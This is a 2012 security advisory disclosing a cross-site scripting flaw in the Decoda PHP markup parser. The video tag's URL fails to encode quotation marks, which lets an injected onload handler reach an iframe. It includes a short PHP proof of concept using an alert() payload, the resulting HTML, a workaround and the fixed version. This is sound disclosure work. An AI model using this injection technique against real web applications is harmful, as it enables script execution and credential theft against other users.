@@ -1,0 +1,137 @@
+Advisory: php-decoda: Cross-Site Scripting in Video Tags
+
+RedTeam Pentesting discovered a cross-site scripting (XSS) vulnerability
+in the PHP markup parser Decoda. This allows attackers that should be
+restricted to the markup supported by Decoda to specify a JavaScript
+event handler for an iframe tag. Depending on the usage of Decoda, this
+allows attackers to execute JavaScript code in the context of other
+users in a web application that uses Decoda.
+
+
+Details
+=======
+
+Product: php-decoda
+Affected Versions: 3.x
+Fixed Versions: 3.3.3
+Vulnerability Type: Cross-Site Scripting
+Security Risk: High
+Vendor URL: http://milesj.me/code/php/decoda
+Vendor Status: fixed version released
+Advisory URL: http://www.redteam-pentesting.de/advisories/rt-sa-2012-002
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+Decoda is a lightweight class that extracts and parses a custom markup
+language; based on the concept of BB code. Decoda supports all the basic
+HTML tags and manages special features for making links and emails
+auto-clickable, using shorthand emails and links, and finally allowing
+the user to add their own code tags.
+
+(from Decoda's homepage)
+
+
+More Details
+============
+
+Decoda supports a directive for videos. For example the Decoda markup
+
+[video="youtube" size="small"]test[/video]
+
+creates the following corresponding HTML code (whitespace adjusted):
+
+<iframe src="http://www.youtube.com/embed/test"; width="560" height="315"
+frameborder="0"></iframe>
+
+The code to generate the iframe tag can be found in the following file:
+
+decoda/templates/video.php
+
+There, the HTML tag is generated as follows:
+
+<?php if ($player == 'embed') { ?>
+        <embed src="<?php echo $url; ?>"
+                type="application/x-shockwave-flash"
+                allowscriptaccess="always"
+                allowfullscreen="true"
+                width="<?php echo $width; ?>"
+                height="<?php echo $height; ?>"></embed>
+
+<?php } else { ?>
+        <iframe src="<?php echo $url; ?>"
+                width="<?php echo $width; ?>"
+                height="<?php echo $height; ?>"
+                frameborder="0"></iframe>
+
+<?php } ?>
+
+The variable $url contains the user input provided in the video markup
+prefixed by the URL to YouTube. Since quotation signs provided by a user
+are not properly encoded, an attacker can use this to specify a
+JavaScript event handler that is executed when the resulting HTML
+document is loaded.
+
+
+Proof of Concept
+================
+
+The following PHP script can be used to demonstrate this vulnerability:
+
+<?php
+include '../decoda/Decoda.php';
+$code = new Decoda();
+$code->addFilter(new VideoFilter()); ?>
+<?php
+
+$decoda_markup = '[video="youtube" size="small"]"';
+$decoda_markup .= 'onload="alert(\'RedTeam Pentesting XSS\');" id="[/video]';
+
+$code->reset($decoda_markup);
+echo $code->parse();
+?>
+
+This results in the following output (whitespace adjusted):
+
+<iframe src="http://www.youtube.com/embed/"; onload="alert('RedTeam
+Pentesting XSS');" id="" width="560" height="315"
+frameborder="0"></iframe>
+
+
+
+Workaround
+==========
+
+Disabling support for the video markup by not adding the corresponding
+filter might close this attack vector depending on the usage of Decoda.
+
+Fix
+===
+
+Update to at least version 3.3.3.
+
+
+Security Risk
+=============
+
+The risk of the described vulnerability is considered to be high. It
+might be lower depending on the use case of Decoda in a web application.
+In case it is used in an web forum to allow formatting of postings, it
+can be used by attackers to completely manipulate the web page showing
+the respective posting by adding arbitrary content, tracking user
+interaction and potentially obtaining credentials from other users.
+
+
+History
+=======
+
+2012-03-26 Vulnerability identified
+2012-04-25 Customer approved disclosure to vendor
+2012-04-26 First attempt to contact vendor
+2012-04-30 Vendor notified
+2012-05-01 Vendor released fixed version
+2012-05-02 Advisory released
